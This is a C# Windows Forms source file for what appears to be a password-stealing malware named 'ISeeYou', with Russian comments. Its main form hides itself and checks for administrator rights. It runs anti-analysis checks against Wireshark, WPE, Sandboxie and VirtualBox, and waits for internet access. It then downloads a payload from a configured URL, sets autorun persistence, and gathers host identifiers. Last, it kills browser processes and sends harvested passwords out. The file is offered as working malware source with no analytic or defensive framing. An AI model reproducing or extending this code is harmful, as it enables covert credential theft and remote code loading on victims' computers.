using System;
using System.Globalization;
using System.Net;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using I_See_you;
using Microsoft.VisualBasic.Devices;

namespace ISeeYou
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Hide();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (GetIsUserAdministrator()) // запуск от имени админа
            {
                //Thread.Sleep(Int32.Parse("[sleep]"));
                //[Message]
                Antis.Anti(RawSettings.AntiWPE, RawSettings.AntiWireshark, RawSettings.AntiSandboxie,
                    RawSettings.AntiVBox);
                bool inet = true;
                while (inet)
                {
                    if (ChekInet())
                    {
                        if (RawSettings.OnLoader)
                            Loader.Download(RawSettings.Downloadurl, RawSettings.DownloadPath);
                        if (RawSettings.StartUpOn)
                            Run.Autorun();
                        RawSettings.Owner = Environment.MachineName;
                        RawSettings.Version = "0.1.1";
                        RawSettings.HWID = Identification.GetId();
                        RawSettings.Location = CultureInfo.CurrentUICulture.ToString();
                        RawSettings.RAM = (new Computer().Info.TotalPhysicalMemory / 1024 / 1024) + " Gb";
                        BlockBrowsers.KillProcess();
                        Passwords.SendFile();
                        inet = false;
                        Application.Exit();
                    }
                    Thread.Sleep(5000);
                }
            }
        }

        private bool ChekInet()
        {
            bool inet = false;
            if (NetCheck.GetCheckForInternetConnection("https://www.google.com"))// проверка интернет соединения
            {
                return true;
            }
            return inet;
        }
        private class NetCheck
        {
            public static bool GetCheckForInternetConnection(string OpenClient)
            {
                try
                {
                    using (new WebClient().OpenRead(OpenClient))
                    {
                        return true;
                    }
                }
                catch { return false; }
            }
        }
        private static bool GetIsUserAdministrator()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
